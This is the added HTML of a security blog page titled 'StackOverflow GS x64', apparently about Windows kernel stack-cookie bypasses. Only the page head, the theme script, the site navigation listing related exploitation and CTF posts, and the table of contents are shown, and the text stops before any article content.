@@ -1,0 +1,1279 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="index, follow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+<link rel="icon" href="/favicon-dark.svg" type="image/svg+xml" media="(prefers-color-scheme: dark)" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>StackOverflow GS x64 – yoshl - IT enjoyer</title>
+  <meta name="description" content="Understanding stack functionality, exploiting ArbitraryRead for leaking RSP value and address. This blog doesnt not finish in any LPE nor SMEP bypass." /><link rel="canonical" href="/winint-compilation/winint-bofgs/" itemprop="url" />
+
+<meta property="og:title" content="StackOverflow GS x64" />
+<meta property="og:description" content="Understanding stack functionality, exploiting ArbitraryRead for leaking RSP value and address. This blog doesnt not finish in any LPE nor SMEP bypass." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/winint-compilation/winint-bofgs/" /><meta property="article:section" content="winint-compilation" />
+
+
+
+  <meta itemprop="name" content="StackOverflow GS x64">
+  <meta itemprop="description" content="Understanding stack functionality, exploiting ArbitraryRead for leaking RSP value and address. This blog doesnt not finish in any LPE nor SMEP bypass.">
+  <meta itemprop="wordCount" content="3320">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="StackOverflow GS x64">
+  <meta name="twitter:description" content="Understanding stack functionality, exploiting ArbitraryRead for leaking RSP value and address. This blog doesnt not finish in any LPE nor SMEP bypass.">
+
+    <link rel="preload" href="/css/compiled/main.min.be56ec629fdfe7569502c7dfe214689a2336e822326f4e4254eeceaf964fed38.css" as="style" integrity="sha256-vlbsYp/f51aVAsff4hRomiM26CIyb05CVO7Or5ZP7Tg=" />
+    <link href="/css/compiled/main.min.be56ec629fdfe7569502c7dfe214689a2336e822326f4e4254eeceaf964fed38.css" rel="stylesheet" integrity="sha256-vlbsYp/f51aVAsff4hRomiM26CIyb05CVO7Or5ZP7Tg=" />
+
+
+
+  <link href="/css/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css" rel="stylesheet" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU=" />
+
+
+  <script>
+     
+    const defaultTheme = 'system';
+
+    const setDarkTheme = () => {
+      document.documentElement.classList.add("dark");
+      document.documentElement.style.colorScheme = "dark";
+    }
+    const setLightTheme = () => {
+      document.documentElement.classList.remove("dark");
+      document.documentElement.style.colorScheme = "light";
+    }
+
+    if ("color-theme" in localStorage) {
+      localStorage.getItem("color-theme") === "dark" ? setDarkTheme() : setLightTheme();
+    } else {
+      defaultTheme === "dark" ? setDarkTheme() : setLightTheme();
+      if (defaultTheme === "system") {
+        window.matchMedia("(prefers-color-scheme: dark)").matches ? setDarkTheme() : setLightTheme();
+      }
+    }
+  </script>
+
+  
+</head>
+<body dir="ltr"><div class="nav-container hx-sticky hx-top-0 hx-z-20 hx-w-full hx-bg-transparent print:hx-hidden">
+  <div class="nav-container-blur hx-pointer-events-none hx-absolute hx-z-[-1] hx-h-full hx-w-full hx-bg-white dark:hx-bg-dark hx-shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] contrast-more:hx-shadow-[0_0_0_1px_#000] dark:hx-shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] contrast-more:dark:hx-shadow-[0_0_0_1px_#fff]"></div>
+
+  <nav class="hx-mx-auto hx-flex hx-items-center hx-justify-end hx-gap-2 hx-h-16 hx-px-6 hx-max-w-[90rem]">
+    <a class="hx-flex hx-items-center hover:hx-opacity-75 ltr:hx-mr-auto rtl:hx-ml-auto" href="/">
+        <span class="hx-mr-2 hx-font-extrabold hx-inline hx-select-none" title="yoshl - IT enjoyer">yoshl - IT enjoyer</span>
+    </a><div class="search-wrapper hx-relative md:hx-w-64">
+  <div class="hx-relative hx-flex hx-items-center hx-text-gray-900 contrast-more:hx-text-gray-800 dark:hx-text-gray-300 contrast-more:dark:hx-text-gray-300">
+    <input
+      placeholder="Search..."
+      class="search-input hx-block hx-w-full hx-appearance-none hx-rounded-lg hx-px-3 hx-py-2 hx-transition-colors hx-text-base hx-leading-tight md:hx-text-sm hx-bg-black/[.05] dark:hx-bg-gray-50/10 focus:hx-bg-white dark:focus:hx-bg-dark placeholder:hx-text-gray-500 dark:placeholder:hx-text-gray-400 contrast-more:hx-border contrast-more:hx-border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx-absolute hx-my-1.5 hx-select-none ltr:hx-right-1.5 rtl:hx-left-1.5 hx-h-5 hx-rounded hx-bg-white hx-px-1.5 hx-font-mono hx-text-[10px] hx-font-medium hx-text-gray-500 hx-border dark:hx-border-gray-100/20 dark:hx-bg-dark/50 contrast-more:hx-border-current contrast-more:hx-text-current contrast-more:dark:hx-border-current hx-items-center hx-gap-1 hx-transition-opacity hx-pointer-events-none hx-hidden sm:hx-flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="search-results hextra-scrollbar hx-hidden hx-border hx-border-gray-200 hx-bg-white hx-text-gray-100 dark:hx-border-neutral-800 dark:hx-bg-neutral-900 hx-absolute hx-top-full hx-z-20 hx-mt-2 hx-overflow-auto hx-overscroll-contain hx-rounded-xl hx-py-2.5 hx-shadow-xl hx-max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] md:hx-max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx-inset-x-0 ltr:md:hx-left-auto rtl:md:hx-right-auto contrast-more:hx-border contrast-more:hx-border-gray-900 contrast-more:dark:hx-border-gray-50 hx-w-screen hx-min-h-[100px] hx-max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+<button type="button" aria-label="Menu" class="hamburger-menu -hx-mr-2 hx-rounded hx-p-2 active:hx-bg-gray-400/20 md:hx-hidden"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class="hx-mx-auto hx-flex max-w-full">
+    <div class="mobile-menu-overlay [transition:background-color_1.5s_ease] hx-fixed hx-inset-0 hx-z-10 hx-bg-black/80 dark:hx-bg-black/60 hx-hidden"></div>
+<aside class="sidebar-container hx-flex hx-flex-col print:hx-hidden md:hx-top-16 md:hx-shrink-0 md:hx-w-64 md:hx-self-start max-md:[transform:translate3d(0,-100%,0)] md:hx-hidden xl:hx-block">
+  
+  <div class="hx-px-4 hx-pt-4 md:hx-hidden">
+    <div class="search-wrapper hx-relative md:hx-w-64">
+  <div class="hx-relative hx-flex hx-items-center hx-text-gray-900 contrast-more:hx-text-gray-800 dark:hx-text-gray-300 contrast-more:dark:hx-text-gray-300">
+    <input
+      placeholder="Search..."
+      class="search-input hx-block hx-w-full hx-appearance-none hx-rounded-lg hx-px-3 hx-py-2 hx-transition-colors hx-text-base hx-leading-tight md:hx-text-sm hx-bg-black/[.05] dark:hx-bg-gray-50/10 focus:hx-bg-white dark:focus:hx-bg-dark placeholder:hx-text-gray-500 dark:placeholder:hx-text-gray-400 contrast-more:hx-border contrast-more:hx-border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx-absolute hx-my-1.5 hx-select-none ltr:hx-right-1.5 rtl:hx-left-1.5 hx-h-5 hx-rounded hx-bg-white hx-px-1.5 hx-font-mono hx-text-[10px] hx-font-medium hx-text-gray-500 hx-border dark:hx-border-gray-100/20 dark:hx-bg-dark/50 contrast-more:hx-border-current contrast-more:hx-text-current contrast-more:dark:hx-border-current hx-items-center hx-gap-1 hx-transition-opacity hx-pointer-events-none hx-hidden sm:hx-flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="search-results hextra-scrollbar hx-hidden hx-border hx-border-gray-200 hx-bg-white hx-text-gray-100 dark:hx-border-neutral-800 dark:hx-bg-neutral-900 hx-absolute hx-top-full hx-z-20 hx-mt-2 hx-overflow-auto hx-overscroll-contain hx-rounded-xl hx-py-2.5 hx-shadow-xl hx-max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] md:hx-max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx-inset-x-0 ltr:md:hx-left-auto rtl:md:hx-right-auto contrast-more:hx-border contrast-more:hx-border-gray-900 contrast-more:dark:hx-border-gray-50 hx-w-screen hx-min-h-[100px] hx-max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+  </div>
+  <div class="hextra-scrollbar hx-overflow-y-auto hx-overflow-x-hidden hx-p-4 hx-grow md:hx-h-[calc(100vh-var(--navbar-height)-var(--menu-height))]">
+    <ul class="hx-flex hx-flex-col hx-gap-1 md:hx-hidden">
+      
+      
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/cbe-blogs/"
+    
+  >Chaos-Based-Encryption Saga
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/cbe-blogs/cbe-fundamentals/"
+    
+  >Pt 1 - Chaos Based Encryption applied to stegoanalysis
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/cbe-blogs/cbe-creation/"
+    
+  >Pt 2.1 - Creation your own Chaos System
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/cbe-blogs/cbe-decochators/"
+    
+  >Pt 2.2 - Decochators Pypi Package
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class="open"><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/winint-compilation/"
+    
+  >WinInt Compilation
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/winint-compilation/winint-understading-processes/"
+    
+  >Elementary: Understanding Processes
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/winint-compilation/winint-arbitrarywrite/"
+    
+  >Arbritrary Write - HEVD (ft. Astharot15)
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/winint-compilation/winint-wfownership/"
+    
+  >Taking Back Control - Windows File Ownership
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/winint-compilation/winint-useafterfree/"
+    
+  >Use-After-Free - HEVD (&#43; SMEP/KASLR/KPP Bypass)
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col open"><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      sidebar-active-item hx-bg-primary-100 hx-font-semibold hx-text-primary-800 contrast-more:hx-border contrast-more:hx-border-primary-500 dark:hx-bg-primary-400/10 dark:hx-text-primary-600 contrast-more:dark:hx-border-primary-500"
+    href="/winint-compilation/winint-bofgs/"
+    
+  >StackOverflow GS x64
+    </a>
+  
+    <ul class='hx-flex hx-flex-col hx-gap-1 hx-relative before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] dark:before:hx-bg-neutral-800 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-pr-3 rtl:before:hx-right-0 ltr:hx-ml-3 rtl:hx-mr-3'><li>
+              <a
+                href="#introduction"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Introduction</a>
+            </li>
+          <li>
+              <a
+                href="#source-analysis"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Source Analysis</a>
+            </li>
+          <li>
+              <a
+                href="#first-contact"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >First contact</a>
+            </li>
+          <li>
+              <a
+                href="#bypassing-gsstack-cookie"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Bypassing GS/Stack Cookie</a>
+            </li>
+          <li>
+              <a
+                href="#conclusion"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Conclusion</a>
+            </li>
+          </ul>
+  
+              
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/vm-reversing/"
+    
+  >Virtual Machine (Reversing x86)
+    </a></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/manuallyupx/"
+    
+  >Manually Unpacking UPX | PE &amp; PE&#43; (x86/x64 Tips)
+    </a></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/why2025-ctf/"
+    
+  >WHY2025 CTF | Full Forensics &#43; Reversing Bonus
+    </a></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/l3akctf-2025/"
+    
+  >L3akCTF 2025 (Post Mortem) | Full Forensics
+    </a></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tjctf-2025/"
+    
+  >TJCTF 2025 | 7/8 Forensics
+    </a></li>
+    </ul>
+
+    <div class="max-xl:hx-hidden hx-h-0 hx-w-64 hx-shrink-0"></div></div>
+  
+  
+    <div class="md:hx-hidden  hx-sticky hx-bottom-0 hx-bg-white dark:hx-bg-dark hx-mx-4 hx-py-4 hx-shadow-[0_-12px_16px_#fff] hx-flex hx-items-center hx-gap-2 dark:hx-border-neutral-800 dark:hx-shadow-[0_-12px_16px_#111] contrast-more:hx-border-neutral-400 contrast-more:hx-shadow-none contrast-more:dark:hx-shadow-none hx-border-t" data-toggle-animation="show"><div class="hx-flex hx-grow hx-flex-col"><button
+  title="Change theme"
+  data-theme="light"
+  class="theme-toggle hx-group hx-h-7 hx-rounded-md hx-px-2 hx-text-left hx-text-xs hx-font-medium hx-text-gray-600 hx-transition-colors dark:hx-text-gray-400 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50"
+  type="button"
+  aria-label="Change theme"
+>
+  <div class="hx-flex hx-items-center hx-gap-2 hx-capitalize"><svg height=12 class="group-data-[theme=light]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="group-data-[theme=light]:hx-hidden">Light</span><svg height=12 class="group-data-[theme=dark]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="group-data-[theme=dark]:hx-hidden">Dark</span></div>
+</button>
+</div></div></aside>
+    
+<nav class="hextra-toc hx-order-last hx-hidden hx-w-64 hx-shrink-0 xl:hx-block print:hx-hidden hx-px-4" aria-label="table of contents">
+    <div class="hextra-scrollbar hx-sticky hx-top-16 hx-overflow-y-auto hx-pr-4 hx-pt-6 hx-text-sm [hyphens:auto] hx-max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] ltr:hx--mr-4 rtl:hx--ml-4"><p class="hx-mb-4 hx-font-semibold hx-tracking-tight">On this page</p><ul>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#introduction">Introduction
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#environment">Environment
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
